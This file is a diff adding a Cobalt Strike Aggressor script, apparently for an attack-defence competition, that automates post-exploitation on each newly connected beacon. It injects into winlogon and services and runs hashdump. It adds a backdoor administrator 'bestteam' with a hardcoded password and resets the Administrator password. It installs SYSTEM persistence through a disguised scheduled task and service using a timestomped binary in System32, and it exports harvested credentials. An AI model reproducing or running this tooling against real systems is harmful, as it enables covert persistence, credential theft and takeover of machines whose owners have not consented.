@@ -1,0 +1,298 @@
+
+
+sub scheduledtask {   
+    local('$listener $payloadPath $bshellcmd');
+    $availableListeners = listeners();
+    if (size($availableListeners()) eq 1) {
+        $listener = $availableListeners[0];
+
+        if (-is64 $1) {
+            $data = artifact($listener, "exe", 1, "x64");
+        } else {
+            $data = artifact($listener, "exe", 1, "x86");
+        }
+
+        $payloadPath = "C:\\Windows\\System32\\windowsboot.exe";
+        binput($1, "Attempting to upload persistence file: $2");
+        bupload_raw($1, $payloadPath, $data);
+        binput($1, "timestomp $payloadPath explorer.exe");
+        bshell($1, "schtasks /delete /tn WindowsBoot /f");
+        $bshellcmd = "schtasks /create /tn WindowsBoot /tr " . $payloadPath . ' /sc onstart /RU "NT AUTHORITY\SYSTEM"';
+        bshell($1, $bshellcmd);
+    } 
+        
+}
+
+sub servicepersist {   
+    local('$listener $payloadPath');
+    $availableListeners = listeners();
+    # Skip listener selection if only one exists
+    if (size($availableListeners()) eq 1) {
+        $listener = $availableListeners[0];
+
+        if (-is64 $1) {
+            $data = artifact($listener, "svcexe", 1, "x64");
+        } else {
+            $data = artifact($listener, "svcexe", 1, "x86");
+        }
+
+        $payloadPath = "C:\\Windows\\System32\\windowsstart.exe";
+        binput($1, "Attempting to upload persistence file: $2");
+        bupload_raw($1, $payloadPath, $data);
+        bshell($1, 'sc delete WindowsStart');
+        bshell($bid, 'sc create WindowsStart binpath= "'.$payloadPath.'" error= ignore start= auto DisplayName= "WindowsStart"');
+        bshell($bid, 'sc description WindowsStart "Helps the system bootup"');
+        bshell($bid, 'sc start WindowsStart');
+    } 
+        
+}
+
+sub firewallrules {
+    local('$ver $arch');
+    $ver = binfo($1, "ver");
+    $arch = binfo($1, "barch");
+    $double_ver = double(binfo($1, "ver"));
+    $hostip = listener_info("listener", "host");
+    if ($double_ver <= 6.0) { #Server 2000
+        #bshell($1, "netsh firewall reset");
+        #bshell($1, "netsh firewall set opmode mode=ENABLE exceptions=enable");
+        #bshell($1, "netsh firewall set icmpsetting type=ALL mode=enable")
+        #bshell($1, "netsh firewall set service type = FileAndPrint enable");
+        #bshell($1, "netsh firewall set service type = RemoteDesktop enable profile=ALL");
+        #bshell($1, "netsh firewall add portopening TCP 80 \"Open Port 80\"");
+        #bshell($1, "netsh firewall add portopening TCP 22 \"Open Port 22\"");
+        #bshell($1, "netsh firewall add portopening TCP 8082 \"Open Port 8082\"");
+    } else {
+        #bshell($1, "netsh advfirewall reset");
+        #bshell($1, "netsh advfirewall set currentprofile firewallpolicy blockinbound,allowoutbound");
+        #bshell($1, "netsh advfirewall set currentprofile state on");
+        #bshell($1, "netsh advfirewall firewall add rule name=\"ICMP Allow incoming V4 echo request\" protocol=icmpv4:8,any dir=in action=allow")
+        #bshell($1, "netsh advfirewall firewall set rule group=\"File and Printer Sharing\" new enable=Yes");
+        #bshell($1, "netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes profile=any ");
+        #bshell($1, "netsh advfirewall firewall add rule name=\"Open Port 80\" dir=in action=allow protocol=TCP localport=80");
+        #bshell($1, "netsh advfirewall firewall add rule name=\"Open Port 22\" dir=in action=allow protocol=TCP localport=22")
+        #bshell($1, "netsh advfirewall firewall add rule name=\"Block Out-Port 0-8081\" dir=out action=block protocol=tcp remoteport=0-8081");
+        #bshell($1, "netsh advfirewall firewall add rule name=\"Block Out-Port 8083-65535\" dir=out action=block protocol=tcp remoteport=8083-65535");
+        #bshell($1, "netsh advfirewall firewall add rule name=\"Block Out UDP\" dir=out action=block protocol=udp");
+        
+
+    }
+
+}
+
+sub windowsupdate {
+    local("$ver $arch");
+    $ver = binfo($1, "ver");
+    $arch = binfo($1, "barch");
+    $double_ver = double(binfo($1, "ver"));
+    if($arch eq "x86" ){
+        if ($ver eq "5.0") { #Server 2000
+            #bupload($1, "file1.exe")
+            #bupload($1, "file2.exe")
+            #bshell($1, "file1.exe /passive /norestart")
+            #bshell($1, "file2.exe /passive /norestart")
+        }else if ($ver eq "5.1") { #Win XP
+
+        }else if ($ver eq "5.2") { #Server 2003
+
+        }else if ($ver eq "6.0") { # Server 2008
+
+        }else if ($ver eq "6.1") { # Server 2008 R2
+            bpowershell($1, "Set-ItemProperty -Path \"HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters\" SMB1 -Type DWORD -Value 0 -Force")
+            #Reboot needed
+        }
+    } else {
+        if ($ver eq "5.1") { #Win XP
+
+        }else if ($ver eq "5.2") { #Server 2003
+
+        }else if ($ver eq "6.0") { # Server 2008
+
+        }else if ($ver eq "6.1") { # Server 2008 R2
+            bpowershell($1, "Set-ItemProperty -Path \"HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters\" SMB1 -Type DWORD -Value 0 -Force")
+            #Reboot needed
+        }else if ($ver eq "6.2") { # Server 2012
+            bpowershell($1, "Set-SmbServerConfiguration -EnableSMB2Protocol $true")
+            bpowershell($1, "Set-SmbServerConfiguration -EnableSMB1Protocol $false")
+        }else if ($ver eq "6.3") { # Server 2012 R2
+            bpowershell($1, "Set-SmbServerConfiguration -EnableSMB2Protocol $true")
+            bpowershell($1, "Set-SmbServerConfiguration -EnableSMB1Protocol $false")
+        }else if ($ver eq "10") { # Server 2016/19
+            bpowershell($1, "Set-SmbServerConfiguration -EnableSMB2Protocol $true")
+            bpowershell($1, "Set-SmbServerConfiguration -EnableSMB1Protocol $false")
+        }
+    }
+}
+
+sub getlogonpid {
+  #println("Searching for winlogon.exe $1 injecting into lsass at $2");
+  bps($1, lambda({
+    local('$pid $name $entry');
+    foreach $entry (split("\n", $2)) {
+      ($name, $ppid, $pid, $arch) = split("\\s+", $entry);
+      # println("Name: $name PID: $pid ");
+      if ($name eq "winlogon.exe") {
+        # $1 is our Beacon ID, $pid is the PID of winlogon.exe
+        [$callback: $1, $pid];
+      }
+    }
+  }, $callback => $2));
+}
+
+sub getpids {
+  #println("Searching for $2. $1 injecting into lsass at $4");
+  bps($1, lambda({
+    local('$pid $name $entry $winlogonPID $wininitPID');
+    foreach $entry (split("\n", $2)) {
+      ($name, $ppid, $pid, $arch) = split("\\s+", $entry);
+      # println("Name: $name PID: $pid ");
+      if ($name eq "winlogon.exe") {
+        # $1 is our Beacon ID, $pid is the PID of winlogon.exe
+        $winlogonPID = $pid;
+      } else if ($name eq "services.exe"){
+        $wininitPID = $pid;
+      }
+    }
+    [$callback: $1, $winlogonPID, $wininitPID];
+  }, $callback => $2));
+}
+
+command beacons {
+	local('$entry $key $value');
+	foreach $entry (beacons()) {
+		println("== " . $entry['id'] . " ==");
+		foreach $key => $value ($entry) {
+			println("$[20]key : $value");
+		}
+		println();
+	}
+}
+
+on heartbeat_5s {
+    foreach $beacon (beacons()) {
+        $id = $beacon['id'];
+        $lastVisit = int(binfo($beacon["id"],"last"));
+        $version = double(binfo($beacon["id"],"ver"));
+ 
+        #Only run commands if are session isn't stale
+        #To get location, run net share
+		if ($lastVisit < 2000 && $version >= 6.0) {
+            #bpowershell($id, "get-content \$env:temp\\tmp.txt | foreach { attrib -s \$_; attrib -r \$_; echo 1395C9E7 | Out-File -FilePath \$_ -Encoding ascii }");
+        } else if ( $lastVisit < 2000 && $version < 6.0) {
+            #bshell($id, "dir c: /s /b /ah | find \"ownership.txt\"  > %TEMP%\\tmp.txt"); 
+            #bshell($id, "FOR /F \"tokens=*\" %f IN (%TEMP%\\tmp.txt) DO ( attrib -s %f && attrib -r %f && echo 1395C9E7 > %f )"); 
+            #bshell($id, "for /F %f in ('type %TEMP%\\tmp.txt') DO  attrib -s %f && attrib -r %f && echo 1395C9E7 > %f"); 
+        }
+
+
+        $weburl = "c:\\inetpub\\wwwroot\\ownership.html";
+        $sshbanner = "c:\\program files\\openssh\\etc\\banner.txt";
+        if ($lastVisit < 2000) {
+            #bshell($id, "if exist $weburl (attrib -s $weburl && attrib -r $weburl && echo 1395C9E7 > $weburl  && type $weburl) else ( echo NoWebHere )");
+            #icacls /? >nul 2>1  && ( echo found ) || ( echo not )
+            #bshell($id, "dnscmd /Recorddelete 1.1.1.in-addr.arpa 1 PTR /f && dnscmd /RecordAdd 1.1.1.in-addr.arpa 1 PTR 1395C9E7 && dnscmd /zonerefresh 1.1.1.in-addr.arpa");
+            #bshell($id, "if exists \"$sshbanner\" (attrib -s \"$sshbanner\" && attrib -r \"$sshbanner\" && echo  > \"$sshbanner\"  && type \"$sshbanner\"") else ( echo NoSSHBanner ));
+        }
+    }
+    
+    foreach $beacon (beacons()){
+        $bid = $beacon["id"];
+		if (int(binfo($beacon["id"],"last")) > 30000) {
+            $host_t = binfo($beacon["id"],"internal");
+	        say("Removing $bid: $host_t");
+            beacon_remove($bid);
+        }	
+	}
+}
+
+on heartbeat_10m {
+    foreach $beacon (beacons()) {
+        $id = $beacon['id'];
+        #bclear($1);
+    }
+}
+
+command creds {
+  @creds = data_query("credentials");
+  $string = "";
+  foreach $cred (@creds) {
+      $user = $cred['user'];
+      $password = $cred['password'];
+      #println("$user $+ : $+ $password");
+      $string = "$string $+ $user $+ : $+ $password \n";
+  }
+  $handle = openf(">creds.txt");
+  println($handle, $string);
+  closef($handle);
+  show_message("Exported to creds.txt");
+}
+
+command export {
+	local('$handle $model $row $entry $index');
+	$handle = openf(">export.txt");
+	
+	foreach $model (data_keys()) {
+		println($handle, "== $model ==");
+		println($handle, data_query($model));
+	}
+	
+	closef($handle);
+	
+	println("See export.txt for the data.");
+}
+
+
+on beacon_initial {
+    #$1 is the ID of the new beacon
+    local('$bid');
+    $bid = $1;
+    bsleep($bid, 1, 0);
+    
+    #Upgrade to for safety
+    getpids($bid, {
+        local('$bid $pid $winlogonPID $wininitPID $count $arch');
+        $bid = $1;
+        $arch = beacon_info($bid, "barch");
+        $pid = binfo($bid, "pid");
+        $winlogonPID  = $2;
+        $wininitPID = $3;
+        $count = 0;
+
+        foreach $beacon (beacons()) {
+            $host = $beacon['external'];
+            if($host eq binfo($1, "external") && int(binfo($bid,"last")) < 5000 ){
+                $count += 1;
+            }
+        }
+
+        if( $pid != $winlogonPID && $pid != $wininitPID && $count < 3) {
+            println("Beacon: $1 injecting into logon PID: $2");
+            if (-is64 $1 ) {
+                binject($1, $winlogonPID, "listener", "x64");
+                binject($1, $wininitPID, "listener", "x64");
+            } else  {
+                binject($1, $winlogonPID, "listener", "x86");
+                binject($1, $wininitPID, "listener", "x86");
+            }
+            bhashdump($bid);
+            bshell($bid, 'net user bestteam /add /active:yes');
+            bshell($bid, 'net user bestteam team33isthebest');
+            bshell($bid, 'net localgroup  administrators bestteam /add');
+            bshell($bid, 'net user administrator team33isthebest');
+            #bshell($1, 'REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f');
+            #bshell($1, 'REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d "0" /f');
+            firewallrules($bid);
+            servicepersist($bid);
+            scheduledtask($bid);
+            #windowsupdate($bid);
+        } else if ($pid == $winlogonPID) {
+            bnote($1,"B-ID: $1 - $arch - winlogon");
+        } else if($pid == $wininitPID){
+            bnote($1,"B-ID: $1 - $arch - services");
+        } else {
+            bexit($bid);
+        }
+    });    
+    
+}
+
